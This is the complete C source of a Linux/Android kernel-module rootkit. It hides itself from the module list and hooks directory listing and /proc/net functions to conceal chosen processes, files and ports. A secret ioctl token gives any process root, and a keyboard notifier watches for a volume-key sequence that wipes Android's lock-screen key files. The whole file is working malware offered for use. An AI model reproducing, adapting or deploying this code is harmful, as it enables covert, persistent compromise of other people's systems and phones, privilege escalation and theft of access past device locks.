#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/capability.h>
#include <linux/mm.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <linux/mm.h>
#include <asm/pgtable.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/mount.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/tcp.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/list.h>
#include <linux/keyboard.h>
#include <linux/kthread.h>

#define AUTH_TOKEN 0x12345678
#define __DEBUG__ 1

unsigned long sequence[] = {
    42,     // Volume Up downpress
    63232,
    63232,
    58,     // Volume Down downpress
    61959,
    61959,
    42,     // Volume Up uppress
    63232,
    63232,
    58,     // Volume Down uppress
    61959,
    61959
};

#define SEQUENCE_SIZE sizeof(sequence)/sizeof(unsigned long)

struct task_struct *ts;
unsigned long sequence_i = 0;
volatile unsigned long to_unlock = 0;

DECLARE_WAIT_QUEUE_HEAD(unlocker_event);

#ifdef _CONFIG_X86_
#define HIJACK_SIZE 6
#else // ARM
#define HIJACK_SIZE 12
#endif

#define TMPSZ 150

//unsigned long *sys_call_table;
static int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);
static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);
static int (*proc_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*root_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static int (*o_root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);

int notify(struct notifier_block *nblock, unsigned long code, void *_param);

struct s_proc_args {
    unsigned short pid;
};

struct s_port_args {
    unsigned short port;
};

struct s_file_args {
    char *name;
    unsigned short namelen;
};

struct s_args {
    unsigned short cmd;
    void *ptr;
};

struct sym_hook {
    void *addr;
    unsigned char o_code[HIJACK_SIZE];
    unsigned char n_code[HIJACK_SIZE];
    struct list_head list;
};

LIST_HEAD(hooked_syms);

struct hidden_port {
    unsigned short port;
    struct list_head list;
};

LIST_HEAD(hidden_tcp4_ports);
LIST_HEAD(hidden_tcp6_ports);
LIST_HEAD(hidden_udp4_ports);
LIST_HEAD(hidden_udp6_ports);

struct hidden_proc {
    unsigned short pid;
    struct list_head list;
};

LIST_HEAD(hidden_procs);

struct hidden_file {
    char *name;
    struct list_head list;
};

LIST_HEAD(hidden_files);

static struct notifier_block nb = {
    .notifier_call = notify
};

struct {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;

char *strnstr ( const char *haystack, const char *needle, size_t n )
{
    char *s = strstr(haystack, needle);

    if ( s == NULL )
        return NULL;

    if ( s - haystack + strlen(needle) <= n )
        return s;
    else
        return NULL;
}

#ifdef _CONFIG_X86_
// Thanks Dan
inline unsigned long disable_wp ( void )
{
    unsigned long cr0;

    preempt_disable();
    barrier();

    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    return cr0;
}

inline void restore_wp ( unsigned long cr0 )
{
    write_cr0(cr0);

    barrier();
    preempt_enable_no_resched();
}
#else // ARM
void cacheflush ( void *begin, unsigned long size )
{
    flush_icache_range((long unsigned int)begin, (long unsigned int)begin + size);
}
#endif

void *get_inet_ioctl ( int family, int type, int protocol )
{
    void *ret;
    struct socket *sock = NULL;

    if ( sock_create(family, type, protocol, &sock) )
        return NULL;

    ret = sock->ops->ioctl;

    sock_release(sock);

    return ret;
}

void *get_vfs_readdir ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->readdir;

    filp_close(filep, 0);

    return ret;
}

void *get_vfs_read ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->read;

    filp_close(filep, 0);

    return ret;
}

void *get_tcp_seq_show ( const char *path )
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    afinfo = PDE(filep->f_dentry->d_inode)->data;
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

void *get_udp_seq_show ( const char *path )
{
    void *ret;
    struct file *filep;
    struct udp_seq_afinfo *afinfo;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    afinfo = PDE(filep->f_dentry->d_inode)->data;
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

void hide_tcp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_tcp4_ports);
}

void unhide_tcp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_tcp6_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_tcp6_ports);
}

void unhide_tcp6_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_tcp6_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_udp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_udp4_ports);
}

void unhide_udp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_udp4_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_udp6_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_udp6_ports);
}

void unhide_udp6_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_udp6_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->pid = pid;

    list_add(&hp->list, &hidden_procs);
}

void unhide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    list_for_each_entry ( hp, &hidden_procs, list )
    {
        if ( pid == hp->pid )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_file ( char *name )
{
    struct hidden_file *hf;

    hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if ( ! hf )
        return;

    hf->name = name;

    list_add(&hf->list, &hidden_files);
}

void unhide_file ( char *name )
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list )
    {
        if ( name == hf->name )
        {
            list_del(&hf->list);
            kfree(hf->name);
            kfree(hf);
            break;
        }
    }
}

void hijack_start ( void *target, void *new )
{
    struct sym_hook *sa;
    unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];

    #ifdef _CONFIG_X86_
    unsigned long o_cr0;

    // push $addr; ret
    memcpy(n_code, "\x68\x00\x00\x00\x00\xc3", HIJACK_SIZE);
    *(unsigned long *)&n_code[1] = (unsigned long)new;
    #else // ARM
    if ( (unsigned long)target % 4 == 0 )
    {
        // ldr pc, [pc, #0]; .long addr; .long addr
        memcpy(n_code, "\x00\xf0\x9f\xe5\x00\x00\x00\x00\x00\x00\x00\x00", HIJACK_SIZE);
        *(unsigned long *)&n_code[4] = (unsigned long)new;
        *(unsigned long *)&n_code[8] = (unsigned long)new;
    }
    else // Thumb
    {
        // add r0, pc, #4; ldr r0, [r0, #0]; mov pc, r0; mov pc, r0; .long addr
        memcpy(n_code, "\x01\xa0\x00\x68\x87\x46\x87\x46\x00\x00\x00\x00", HIJACK_SIZE);
        *(unsigned long *)&n_code[8] = (unsigned long)new;
        target--;
    }
    #endif

    #if __DEBUG__
    printk("Hooking function 0x%p with 0x%p\n", target, new);
    #endif

    memcpy(o_code, target, HIJACK_SIZE);

    #ifdef _CONFIG_X86_
    o_cr0 = disable_wp();
    memcpy(target, n_code, HIJACK_SIZE);
    restore_wp(o_cr0);
    #else // ARM
    memcpy(target, n_code, HIJACK_SIZE);
    cacheflush(target, HIJACK_SIZE);
    #endif

    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
    if ( ! sa )
        return;

    sa->addr = target;
    memcpy(sa->o_code, o_code, HIJACK_SIZE);
    memcpy(sa->n_code, n_code, HIJACK_SIZE);

    list_add(&sa->list, &hooked_syms);
}

void hijack_pause ( void *target )
{
    struct sym_hook *sa;

    #if __DEBUG__
    printk("Pausing function hook 0x%p\n", target);
    #endif

    list_for_each_entry ( sa, &hooked_syms, list )
        if ( target == sa->addr )
        {
            #ifdef _CONFIG_X86_
            unsigned long o_cr0 = disable_wp();
            memcpy(target, sa->o_code, HIJACK_SIZE);
            restore_wp(o_cr0);
            #else // ARM
            memcpy(target, sa->o_code, HIJACK_SIZE);
            cacheflush(target, HIJACK_SIZE);
            #endif
        }
}

void hijack_resume ( void *target )
{
    struct sym_hook *sa;

    #if __DEBUG__
    printk("Resuming function hook 0x%p\n", target);
    #endif

    list_for_each_entry ( sa, &hooked_syms, list )
        if ( target == sa->addr )
        {
            #ifdef _CONFIG_X86_
            unsigned long o_cr0 = disable_wp();
            memcpy(target, sa->n_code, HIJACK_SIZE);
            restore_wp(o_cr0);
            #else // ARM
            memcpy(target, sa->n_code, HIJACK_SIZE);
            cacheflush(target, HIJACK_SIZE);
            #endif
        }
}

void hijack_stop ( void *target )
{
    struct sym_hook *sa;

    #if __DEBUG__
    printk("Unhooking function 0x%p\n", target);
    #endif

    list_for_each_entry ( sa, &hooked_syms, list )
        if ( target == sa->addr )
        {
            #ifdef _CONFIG_X86_
            unsigned long o_cr0 = disable_wp();
            memcpy(target, sa->o_code, HIJACK_SIZE);
            restore_wp(o_cr0);
            #else // ARM
            memcpy(target, sa->o_code, HIJACK_SIZE);
            cacheflush(target, HIJACK_SIZE);
            #endif

            list_del(&sa->list);
            kfree(sa);
            break;
        }
}

static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    hijack_resume(tcp4_seq_show);

    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_tcp6_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp6_seq_show);
    ret = tcp6_seq_show(seq, v);
    hijack_resume(tcp6_seq_show);

    list_for_each_entry ( hp, &hidden_tcp6_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp4_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(udp4_seq_show);
    ret = udp4_seq_show(seq, v);
    hijack_resume(udp4_seq_show);

    list_for_each_entry ( hp, &hidden_udp4_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp6_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(udp6_seq_show);
    ret = udp6_seq_show(seq, v);
    hijack_resume(udp6_seq_show);

    list_for_each_entry ( hp, &hidden_udp6_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list )
        if ( ! strcmp(name, hf->name) )
            return 0;

    return o_root_filldir(__buf, name, namelen, offset, ino, d_type);
}

int n_root_readdir ( struct file *file, void *dirent, filldir_t filldir )
{
    int ret;

    if ( ! file || ! file->f_vfsmnt ) // XXX is this necessary?
        return 0;

    o_root_filldir = filldir;

    hijack_pause(root_readdir);
    ret = root_readdir(file, dirent, &n_root_filldir);
    hijack_resume(root_readdir);

    return ret;
}

static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    list_for_each_entry ( hp, &hidden_procs, list )
        if ( pid == hp->pid )
            return 0;

    return o_proc_filldir(__buf, name, namelen, offset, ino, d_type);
}

int n_proc_readdir ( struct file *file, void *dirent, filldir_t filldir )
{
    int ret;

    o_proc_filldir = filldir;

    hijack_pause(proc_readdir);
    ret = proc_readdir(file, dirent, &n_proc_filldir);
    hijack_resume(proc_readdir);

    return ret;
}

int notify ( struct notifier_block *nblock, unsigned long code, void *_param )
{
    struct keyboard_notifier_param *param = _param;

    #ifdef __DEBUG__
    printk("KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
    #endif

    if ( sequence[sequence_i] == param->value )
    {
        if ( ++sequence_i == SEQUENCE_SIZE )
        {
            #ifdef __DEBUG__
            printk("Key sequence detected, unlock the screen!\n");
            #endif

            to_unlock = 1;
            sequence_i = 0;
            wake_up_interruptible(&unlocker_event);
        }
    }
    else
        sequence_i = 0;

    return NOTIFY_OK;
}

int unlocker ( void *data )
{
    while ( 1 )
    {
        wait_event_interruptible(unlocker_event, (to_unlock == 1));

        #if __DEBUG__
        printk("Inside the unlocker thread, removing screen lock\n");
        #endif

        #ifdef _CONFIG_X86_
        // Kill screenlock
        #else // ARM
        filp_close(filp_open("/data/system/gesture.key", O_TRUNC, 0), NULL);
        filp_close(filp_open("/data/system/password.key", O_TRUNC, 0), NULL);
        #endif

        to_unlock = 0;

        if ( kthread_should_stop() )
            break;
    }

    return 0;
}

static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
{
    int ret;
    struct s_args args;

    if ( cmd == AUTH_TOKEN )
    {
        #if __DEBUG__
        printk("Authenticated, receiving command\n");
        #endif

        ret = copy_from_user(&args, (void *)arg, sizeof(args));
        if ( ret )
            return 0;

        switch ( args.cmd )
        {
            /* Upgrade privileges of current process */
            case 0:
                #if __DEBUG__
                printk("Elevating privileges of PID %hu\n", current->pid);
                #endif

                #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
                current->uid   = 0;
                current->suid  = 0;
                current->euid  = 0;
                current->gid   = 0;
                current->egid  = 0;
                current->fsuid = 0;
                current->fsgid = 0;
                cap_set_full(current->cap_effective);
                cap_set_full(current->cap_inheritable);
                cap_set_full(current->cap_permitted);
                #else
                commit_creds(prepare_kernel_cred(0));
                #endif
                break;

            /* Hide process */
            case 1:
                {
                    struct s_proc_args proc_args;

                    ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Hiding PID %hu\n", proc_args.pid);
                    #endif

                    hide_proc(proc_args.pid);
                }
                break;

            /* Unhide process */
            case 2:
                {
                    struct s_proc_args proc_args;

                    ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Unhiding PID %hu\n", proc_args.pid);
                    #endif

                    unhide_proc(proc_args.pid);
                }
                break;

            /* Hide TCPv4 port */
            case 3:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Hiding TCPv4 port %hu\n", port_args.port);
                    #endif

                    hide_tcp4_port(port_args.port);
                }
                break;

            /* Unhide TCPv4 port */
            case 4:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Unhiding TCPv4 port %hu\n", port_args.port);
                    #endif

                    unhide_tcp4_port(port_args.port);
                }
                break;

            /* Hide TCPv6 port */
            case 5:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Hiding TCPv6 port %hu\n", port_args.port);
                    #endif

                    hide_tcp6_port(port_args.port);
                }
                break;

            /* Unhide TCPv6 port */
            case 6:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Unhiding TCPv6 port %hu\n", port_args.port);
                    #endif

                    unhide_tcp6_port(port_args.port);
                }
                break;

            /* Hide UDPv4 port */
            case 7:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Hiding UDPv4 port %hu\n", port_args.port);
                    #endif

                    hide_udp4_port(port_args.port);
                }
                break;

            /* Unhide UDPv4 port */
            case 8:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Unhiding UDPv4 port %hu\n", port_args.port);
                    #endif

                    unhide_udp4_port(port_args.port);
                }
                break;

            /* Hide UDPv6 port */
            case 9:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Hiding UDPv6 port %hu\n", port_args.port);
                    #endif

                    hide_udp6_port(port_args.port);
                }
                break;

            /* Unhide UDPv6 port */
            case 10:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Unhiding UDPv6 port %hu\n", port_args.port);
                    #endif

                    unhide_udp6_port(port_args.port);
                }
                break;

            /* Hide file/directory */
            case 11:
                {
                    char *name;
                    struct s_file_args file_args;

                    ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
                    if ( ret )
                        return 0;

                    name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
                    if ( ! name )
                        return 0;

                    ret = copy_from_user(name, file_args.name, file_args.namelen);
                    if ( ret )
                    {
                        kfree(name);
                        return 0;
                    }

                    name[file_args.namelen+1] = 0;

                    #if __DEBUG__
                    printk("Hiding file/dir %s\n", name);
                    #endif

                    hide_file(name);
                }
                break;

            /* Unhide file/directory */
            case 12:
                {
                    char *name;
                    struct s_file_args file_args;

                    ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
                    if ( ret )
                        return 0;

                    name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
                    if ( ! name )
                        return 0;

                    ret = copy_from_user(name, file_args.name, file_args.namelen);
                    if ( ret )
                    {
                        kfree(name);
                        return 0;
                    }

                    name[file_args.namelen + 1] = 0;

                    #if __DEBUG__
                    printk("Unhiding file/dir %s\n", name);
                    #endif

                    unhide_file(name);

                    kfree(name);
                }
                break;

            default:
                break;
        }

        return 0;
    }

    hijack_pause(inet_ioctl);
    ret = inet_ioctl(sock, cmd, arg);
    hijack_resume(inet_ioctl);

    return ret;
}

static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
{
    /* Hide LKM and all symbols */
    list_del_init(&__this_module.list);

    /* Hook /proc for hiding processes */
    proc_readdir = get_vfs_readdir("/proc");
    hijack_start(proc_readdir, &n_proc_readdir);

    /* Hook / for hiding files and directories */
    root_readdir = get_vfs_readdir("/");
    hijack_start(root_readdir, &n_root_readdir);

    /* Hook /proc/net/tcp for hiding tcp4 connections */
    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
    hijack_start(tcp4_seq_show, &n_tcp4_seq_show);

    /* Hook /proc/net/tcp6 for hiding tcp6 connections */
    tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
    hijack_start(tcp6_seq_show, &n_tcp6_seq_show);

    /* Hook /proc/net/udp for hiding udp4 connections */
    udp4_seq_show = get_udp_seq_show("/proc/net/udp");
    hijack_start(udp4_seq_show, &n_udp4_seq_show);

    /* Hook /proc/net/udp6 for hiding udp4 connections */
    udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
    hijack_start(udp6_seq_show, &n_udp6_seq_show);

    /* Hook inet_ioctl() for rootkit control */
    inet_ioctl = get_inet_ioctl(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    hijack_start(inet_ioctl, &n_inet_ioctl);

    /* Install a keylogger to monitor for magic key sequence*/
    register_keyboard_notifier(&nb);
    ts = kthread_run(unlocker, NULL, "kthread");

    return 0;
}

static void __exit mischief_managed ( void )
{
    kthread_stop(ts);
    unregister_keyboard_notifier(&nb);
    hijack_stop(inet_ioctl);
    hijack_stop(udp6_seq_show);
    hijack_stop(udp4_seq_show);
    hijack_stop(tcp6_seq_show);
    hijack_stop(tcp4_seq_show);
    hijack_stop(root_readdir);
    hijack_stop(proc_readdir);
}

module_init(i_solemnly_swear_that_i_am_up_to_no_good);
module_exit(mischief_managed);

MODULE_LICENSE("GPL");
